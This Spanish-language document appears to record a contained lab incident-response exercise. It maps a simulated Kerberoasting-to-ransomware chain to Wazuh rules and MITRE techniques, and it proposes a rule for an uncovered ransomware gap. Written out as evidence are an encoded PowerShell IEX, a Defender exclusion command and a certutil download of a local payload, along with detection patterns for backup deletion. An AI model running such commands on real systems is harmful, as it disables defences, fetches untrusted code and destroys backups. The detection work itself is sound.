# 📂 Evidencia del incidente (ground truth)

> Telemetría REAL capturada el **2026-06-15** en el lab `corp.local` (Hyper-V aislado) durante el ejercicio de
> IR. Fuentes: alertas del manager Wazuh (`alerts.json`), el casebook del Active Response (`soc-cases.log`) y el
> estado del endpoint WIN11. **Ejercicio benigno y contenido**: ningún cifrado real; el ransomware se simuló
> renombrando ficheros *dummy* en un sandbox (`C:\soc-ir-sim\victim-data`).

## Cadena de ataque detectada (WIN11 = 10.10.10.21, DC01 = 10.10.10.10)

| Hora (UTC) | Etapa / MITRE | Acción del atacante | Regla Wazuh | Detección |
|------------|---------------|---------------------|-------------|-----------|
| 19:21:39 | Credential Access · **T1558.003** | Kerberoasting: TGS del señuelo `svc_sql` (en DC01) | **100110** (n12) | ✅ honeypot |
| 19:50:08 | Execution · **T1059.001 / T1027** | PowerShell `-EncodedCommand` → `IEX "...IR-SIM-EXEC-MARKER"` | **100120** (n12) | ✅ |
| 19:50:08 | Defense Evasion · **T1562.001** | `Add-MpPreference -ExclusionPath C:\soc-ir-sim` (revertido) | **100130** (n12) | ✅ |
| 19:50:09–14 | Ingress Tool Transfer · **T1105** | `certutil -urlcache -f http://127.0.0.1/ir-sim-payload` | **100150** (n10) | ✅ |
| 19:50:19 | (EDR) | Defender **detecta** el certutil = `Trojan:Win32/Ceprolad.A` | **100160** (n12) | ✅ EID 1116 |
| 19:50:32 | (EDR) | Defender **bloquea/cuarentena** la amenaza | **100161** (n10) | ✅ EID 1117 |
| ~19:50:35 | **Impact · T1486** | "Ransomware": 6 ficheros dummy → `.locked` + nota de rescate | **— ninguna —** | ❌ **GAP** |

## Casebook — casos abiertos automáticamente por el Active Response (`soc-cases.log`)

El AR `open-soc-case` (grupo `soc_lab`) abrió un caso por cada detección, **sin intervención del analista**:

```json
{"case":"CASE-20260615-192139-100110","rule":"100110","level":12,"agent":"DC01","mitre":"T1558.003","status":"NEW", ...}
{"case":"CASE-20260615-195008-100120","rule":"100120","level":12,"agent":"WIN11","mitre":"T1059.001,T1027","status":"NEW", ... "IEX \"Write-Output 'IR-SIM-EXEC-MARKER'\""}
{"case":"CASE-20260615-195008-100130","rule":"100130","level":12,"agent":"WIN11","mitre":"T1562.001","status":"NEW", ...}
{"case":"CASE-20260615-195009-100150","rule":"100150","level":10,"agent":"WIN11","mitre":"T1105","status":"NEW", ...}
{"case":"CASE-20260615-195014-100150","rule":"100150","level":10,"agent":"WIN11","mitre":"T1105","status":"NEW", ...}
{"case":"CASE-20260615-195019-100160","rule":"100160","level":12,"agent":"WIN11","status":"NEW", ...}
{"case":"CASE-20260615-195032-100161","rule":"100161","level":10,"agent":"WIN11","status":"NEW", ...}
```

## Defensa en profundidad (la observación clave del IR)

La etapa de **Ingress (certutil)** disparó **dos** controles independientes sobre el mismo evento:
- **Detección propia (SIEM):** regla `100150` vía Security 4688 (`commandLine`).
- **EDR (Defender):** detectó (`1116`) y **bloqueó** (`1117`) el binario como `Trojan:Win32/Ceprolad.A` (ThreatID 2147726914) → reglas `100160`/`100161`.

## Impacto simulado (endpoint WIN11)

- Directorio víctima: `C:\soc-ir-sim\victim-data\`
- **6 ficheros** `documento_1..6.txt` renombrados a `*.txt.locked`.
- Nota de rescate: `RECOVER-FILES.txt` (marcada `[[ SIMULACION ... SIN CIFRADO REAL ]]`).
- **No detectado** por ninguna regla ni por Defender (renombrados benignos de ficheros dummy) → ver §gap.

## Gap de detección descubierto por el ejercicio

Las etapas tempranas (execution → evasion → ingress) se detectaron y Defender **frenó** el certutil, pero la
**etapa de impacto (T1486, cifrado/renombrado masivo) no disparó nada**. En un ataque real donde el atacante
hubiera traído su propio binario (no un LOLBin que Defender ya conoce), el cifrado habría completado sin alerta.
→ **Regla candidata** (siguiente ID libre, p. ej. `100180`): detección conductual de ransomware — creación masiva
de ficheros con extensión homogénea/anómala, aparición de notas de rescate (`*RECOVER*`, `*DECRYPT*`), o
`vssadmin/wbadmin/bcdedit` borrando copias de seguridad (T1490). Cierra el ciclo *IR → detección* (igual que H4→100170).
